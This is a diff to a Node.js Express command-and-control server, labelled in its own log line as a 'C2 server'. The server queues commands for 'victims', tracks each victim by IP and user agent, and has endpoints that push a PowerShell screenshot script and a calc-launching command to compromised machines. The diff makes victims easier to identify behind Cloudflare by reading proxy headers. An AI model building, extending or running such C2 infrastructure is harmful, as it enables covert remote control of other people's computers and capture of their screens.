@@ -1,11 +1,16 @@
 const express = require("express");
 const cors = require("cors");
 const bodyParser = require("body-parser");
+const fs = require("fs");
+const path = require("path");
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
+
+// Let Express trust proxy headers (important for Cloudflare)
+app.set("trust proxy", true);
 
 // ====== State ======
 const commandQueue = new Map(); // identity -> array of commands
@@ -16,9 +21,14 @@ let outputLog = [];
 
 // ====== Helpers ======
 function getIdentity(req) {
-  const ip = req.ip || req.connection.remoteAddress;
+  const realIp =
+    req.headers["cf-connecting-ip"] ||
+    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+    req.ip ||
+    req.connection.remoteAddress;
+
   const userAgent = req.headers["user-agent"] || "unknown";
-  return `${ip} | ${userAgent}`;
+  return `${realIp} | ${userAgent}`;
 }
 
 function ensureVictim(identity) {
@@ -93,16 +103,14 @@ app.post("/send-calc", (req, res) => {
   res.sendStatus(200);
 });
 
-const fs = require("fs");
-const path = require("path");
 // Dashboard screenshot victim screen
 app.post("/send_screenshot", (req, res) => {
-  const { victim_id, command } = req.body;
+  const { victim_id } = req.body;
   const identity = idToIdentity.get(victim_id);
   if (!identity) return res.status(400).send("Invalid victim ID");
 
   const scriptPath = path.join(__dirname, "programs", "screenshot", "Screenshot.ps1");
-
+  let command;
   try {
     command = fs.readFileSync(scriptPath, "utf8");
   } catch (err) {
@@ -144,3 +152,4 @@ const PORT = 8000;
 app.listen(PORT, () => {
   console.log(`C2 server running on port ${PORT}`);
 });
+
